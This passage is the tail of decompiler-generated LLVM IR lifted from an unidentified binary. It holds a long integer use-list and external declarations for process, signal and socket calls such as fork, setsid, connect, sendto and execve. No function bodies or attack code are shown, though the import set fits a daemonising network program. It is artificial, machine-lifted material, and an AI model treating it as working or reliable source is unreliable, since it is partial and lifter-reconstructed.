1440, 1441, 1442, 1443, 1444, 1445, 1446, 1447, 1448, 1449, 1450, 1451, 1452, 1453, 1454, 1455, 1456, 1457, 1458, 1459, 1460, 1461, 1462, 1463, 1464, 1465, 1466, 1467, 1468, 1469, 1470, 1471, 1472, 1473, 1474, 1475, 1476, 1477, 1478, 1479, 1480, 1481, 1482, 1483, 1484, 1485, 1486, 1487, 1488, 1489, 1490, 1491, 1492, 1493, 1494, 1495, 1496, 1497, 1498, 1499, 1500, 1501, 1502, 1503, 1504, 1505, 1506, 1507, 1508, 1509, 1510, 1511, 1512, 1513, 1514, 1515, 1516, 1517, 1518, 1519, 1520, 1521, 1522, 1523, 1524, 1525, 1526, 1527, 1528, 1529, 1530, 1531, 1532, 1533, 1534, 1535, 1536, 1537, 1538, 1539, 1540, 1541, 1542, 1543, 1544, 1545, 1546, 1547, 1548, 1549, 1550, 1551, 1552, 1553, 1554, 1555, 1556, 1557, 1558, 1559, 1560, 1561, 1562, 1563, 1564, 1565, 1566, 1567, 1568, 1569, 1570, 1571, 1572, 1573, 1574, 1575, 1576, 1577, 1578, 1579, 1580, 1581, 1582, 1583, 1584, 1585, 1586, 1587, 1588, 1589, 1590, 1591, 1592, 1593, 1594, 1595, 1596, 1597, 1598, 1599, 1600, 1601, 1602, 1603, 1604, 1605, 1606, 1607, 1608, 1609, 1610, 1611, 1612, 1613, 1614, 1615, 1616, 1617, 1618, 1619, 1620, 1621, 1622, 1623, 1624, 1625, 1626, 1627, 1628, 1629, 1630, 1631, 1632, 1633, 1634, 1635, 1636, 1637, 1638, 1639, 1640, 1641, 1642, 1643, 1644, 1645, 1646, 1647, 1648, 1649, 1650, 1651, 1652, 1653, 1654, 1655, 1656, 1657, 1658, 1659, 1660, 1661, 1662, 1663, 1664, 1665, 1666, 1667, 1668, 1669, 1670, 1671, 1672, 1673, 1674, 1675, 1676, 1677, 1678, 1679, 1680, 1681, 1682, 1683, 1684, 1685, 1686, 1687, 1688, 1689, 1690, 1691, 1692, 1693, 1694, 1695, 1696, 1697, 1698, 1699, 1700, 1701, 1702, 1703, 1704, 1705, 1706, 1707, 1708, 1709, 1710, 1711, 1712, 1713, 1714, 1715, 1716, 1717, 1718, 1719, 1720, 1721, 1722, 1723, 1724, 1725, 1726, 1727, 1728, 1729, 1730, 1731, 1732, 1733, 1734, 1735, 1736, 1737, 1738, 1739, 1740, 1741, 1742, 1743, 1744, 1745, 1746, 1747, 1748, 1749, 1750, 1751, 1752, 1753, 1754, 1755, 1756, 1757, 1758, 1759, 1760, 1761, 1762, 1763, 1764, 1765, 1766, 1767, 1768, 1769, 1770, 1771, 1772, 1773, 1774, 1775, 1776, 1777, 1778, 1779, 1780, 1781, 1782, 1783, 1784, 1785, 1786, 1787, 1788, 1789, 1792, 1793, 1794, 1795, 1796, 1797, 1798, 1799, 1800, 1801, 1802, 1803, 1804, 1805, 1806, 1807, 1808, 1809, 1810, 1811, 1812, 1813, 1814, 1815, 1816, 1817, 1818, 1819, 1820, 1821, 1822, 1823, 1824, 1825, 1826, 1827, 1828, 1829, 1830, 1831, 1832, 1833, 1834, 1835, 1836, 1837, 1838, 1839, 1840, 1841, 1842, 1843, 1844, 1845, 1846, 1847, 1848, 1849, 1850, 1851, 1852, 1853, 1854, 1855, 1856, 1857, 1858, 1859, 1860, 2873, 2874, 2875, 2876, 2877, 2878, 2879, 2880, 2881, 2882, 2883, 2884, 2885, 2886, 2887 }
  uselistorder i32* @r4, {}
}

declare i32 @vfork() local_unnamed_addr

declare i32 @fork() local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @getpid() local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @pipe([2 x i32]) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @setsid() local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @connect(i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @getsockname(i32, %sockaddr*, i32*) local_unnamed_addr

declare i32 @recv(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @send(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @sendto(i32, i32*, i32, i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @setsockopt(i32, i32, i32, i32*, i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare i32 @execve(i8*, [1 x i8*], [1 x i8*]) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @brk(i32*) local_unnamed_addr

declare i32 @poll(%pollfd*, i32, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8* @__decompiler_undefined_function_1() local_unnamed_addr

declare i8 @__decompiler_undefined_function_2() local_unnamed_addr

declare i8** @__decompiler_undefined_function_3() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

declare float @fabsf(float)

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
